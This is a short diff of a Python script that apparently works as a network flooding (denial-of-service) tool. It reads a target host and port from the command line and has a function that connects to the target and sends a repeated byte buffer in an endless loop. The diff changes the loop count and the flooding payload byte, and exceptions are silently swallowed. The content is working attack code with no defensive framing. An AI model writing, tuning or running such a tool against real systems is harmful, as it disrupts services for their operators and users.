@@ -5,7 +5,7 @@ import threading
 host = str(sys.argv[1])
 port = int(sys.argv[2])
 method = str(sys.argv[3])
-loops = 35000
+loops = 20000
 
 def send_packet(amplifier):
     try:
@@ -13,7 +13,7 @@ def send_packet(amplifier):
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.connect((str(host), int(port)))
         while True:
-            s.send(b"\x99" * amplifier)
+            s.send(b"\x500" * amplifier)
     except:
         return
     s.close()
